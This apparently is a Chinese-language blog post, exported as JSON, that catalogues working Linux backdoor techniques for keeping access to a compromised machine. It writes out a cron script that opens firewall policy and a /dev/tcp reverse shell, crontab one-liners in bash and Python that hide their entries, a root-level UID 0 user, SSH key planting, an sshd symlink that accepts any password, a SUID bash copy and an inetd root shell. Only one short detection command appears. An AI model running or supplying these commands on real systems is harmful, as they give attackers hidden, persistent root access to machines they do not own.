{"title":"Linux后门总结","slug":"2018-11-7-Linux后门总结","date":"2018-11-07T11:09:37.000Z","updated":"2018-11-11T15:07:19.450Z","comments":true,"excerpt":"","content":"<h1 id=\"测试环境\"><a href=\"#测试环境\" class=\"headerlink\" title=\"测试环境\"></a>测试环境</h1><p>ubuntu16.04<br>反弹shell目标：127.0.0.1:233</p>\n<h1 id=\"cron定时反弹shell\"><a href=\"#cron定时反弹shell\" class=\"headerlink\" title=\"cron定时反弹shell\"></a>cron定时反弹shell</h1><h2 id=\"修改crontab文件\"><a href=\"#修改crontab文件\" class=\"headerlink\" title=\"修改crontab文件\"></a>修改crontab文件</h2><p> 创建文件 /etc/…</p>\n<pre><code>#!/bin/bash\n\nif netstat -ano|grep -v grep | grep &quot;127.0.0.1&quot;&gt;/dev/null\n\nthen\n\necho &quot;OK&quot;&gt;/dev/null\n\nelse\n\n/sbin/iptables --policy INPUT ACCEPT\n\n/sbin/iptables --policy OUTPUT ACCEPT\n\nbash -i &gt;&amp; /dev/tcp/127.0.0.1/233 0&gt;&amp;1\n\nfi\n</code></pre><p>增加权限</p>\n<p><code>chmod +sx /etc/...</code></p>\n<p>然后在/etc/crontab中添加定时任务</p>\n<p><code>*/1 * * * * root /etc/...</code></p>\n<p>最后重启一下 crond 的服务<br><code>service cron reload</code></p>\n<h2 id=\"一句话Crontab后门\"><a href=\"#一句话Crontab后门\" class=\"headerlink\" title=\"一句话Crontab后门\"></a>一句话Crontab后门</h2><p>bash版本<br><code>(crontab -l;printf &quot;*/1 * * * * exec 9&lt;&gt; /dev/tcp/127.0.0.1/233;exec 0&lt;&amp;9;exec 1&gt;&amp;9 2&gt;&amp;1;/bin/bash --noprofile -i;\\rno crontab for</code>whoami<code>%100c\\n&quot;)|crontab -</code><br>python版本<br><code>(crontab -l;printf &quot;*/5 * * * *  /usr/bin/python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;127.0.0.1\\&quot;,233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);&#39;;\\r\\rno crontab for</code>whoami<code>%100c\\n&quot;)|crontab -</code></p>\n<h1 id=\"Linux-Unix-添加-UID-为-0-的用户\"><a href=\"#Linux-Unix-添加-UID-为-0-的用户\" class=\"headerlink\" title=\"Linux/Unix 添加 UID 为 0 的用户\"></a>Linux/Unix 添加 UID 为 0 的用户</h1><p>免交互设置密码<br>    useradd seradd -u 0 -o -g root -G fdrag0n</p>\n<pre><code>echo &quot;passwd&quot; | passwd --stdin fdrag0n\n</code></pre><p>因为linux可能有密码策略<br>所以推荐使用强密码替换passwd</p>\n<h1 id=\"爆破linux密码\"><a href=\"#爆破linux密码\" class=\"headerlink\" title=\"爆破linux密码\"></a>爆破linux密码</h1><p>取出/etc/shadow<br>hashcat爆破</p>\n<h1 id=\"ssh公钥免密\"><a href=\"#ssh公钥免密\" class=\"headerlink\" title=\"ssh公钥免密\"></a>ssh公钥免密</h1><p>将客户端生成的ssh公钥写到所控服务器的~/.ssh/authorized_keys中，然后客户端利用私钥完成认证即可登录。</p>\n<p>客户端：</p>\n<pre><code>$ ssh-keygen -t rsa\n$ ls\nid_rsa  id_rsa.pub\n</code></pre><p>把id_rsa.pub写入服务端的authorized_keys中，并修改好相应权限。</p>\n<p>服务端：</p>\n<pre><code>$ chmod 600 ~/.ssh/authorized_keys\n$ chmod 700 ~/.ssh\n</code></pre><p>这种后门的特点是简单易用，但在实战中会被服务器的配置环境所限制，以及容易被发现(只要运维不傻)。</p>\n<h1 id=\"软连接后门\"><a href=\"#软连接后门\" class=\"headerlink\" title=\"软连接后门\"></a>软连接后门</h1><pre><code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=23333;\n</code></pre><p>经典后门。直接对sshd建立软连接，之后用任意密码登录即可。</p>\n<p>但这隐蔽性很弱，防护软件或者查看端口状态都可以找到。</p>\n<p><strong>重启会断开</strong></p>\n<h1 id=\"SUID-shell\"><a href=\"#SUID-shell\" class=\"headerlink\" title=\"SUID shell\"></a>SUID shell</h1><p>在root账号下执行</p>\n<pre><code>cp /bin/bash /.fdrag0n\nchmod 4755 /.fdrag0n\n</code></pre><p>在普通用户下执行</p>\n<pre><code>/.fdrag0n -p\n</code></pre><p><strong>检查手段</strong></p>\n<pre><code>find / -perm +4000 -ls\n</code></pre><h1 id=\"inetd后门\"><a href=\"#inetd后门\" class=\"headerlink\" title=\"inetd后门\"></a>inetd后门</h1><p>修改 /etc/inetd.conf 文件</p>\n<p>原文件：</p>\n<pre><code>#chargen dgram udp wait root internal\n\n#discard stream tcp nowait root internal\n\n#discard dgram udp wait root internal\n\n#daytime stream tcp nowait root internal\n</code></pre><p>修改为:</p>\n<pre><code>#discard stream tcp nowait root internal\n\n#discard dgram udp wait root internal\n\ndaytime stream tcp nowait root /bin/bash bash -i\n</code></pre><p>然后重启inetd</p>\n<pre><code>ps -ef | grep inetdroot\nkill -HUP xxx\n</code></pre><p>然后nc连接即可</p>\n<h1 id=\"rootkit\"><a href=\"#rootkit\" class=\"headerlink\" title=\"rootkit\"></a>rootkit</h1><h2 id=\"openssh后门\"><a href=\"#openssh后门\" class=\"headerlink\" title=\"openssh后门\"></a>openssh后门</h2><p>参见<a href=\"https://fdrag0n.github.io/2018/05/15/SSH后门复现/\" title=\"ssh后门复现\" target=\"_blank\" rel=\"noopener\">https://fdrag0n.github.io/2018/05/15/SSH后门复现/</a></p>\n<h2 id=\"内核级rookit\"><a href=\"#内核级rookit\" class=\"headerlink\" title=\"内核级rookit\"></a>内核级rookit</h2><p>暂未复现，复现后补上</p>\n","categories":[],"tags":[{"name":"linux","path":"api/tags/linux.json"}]}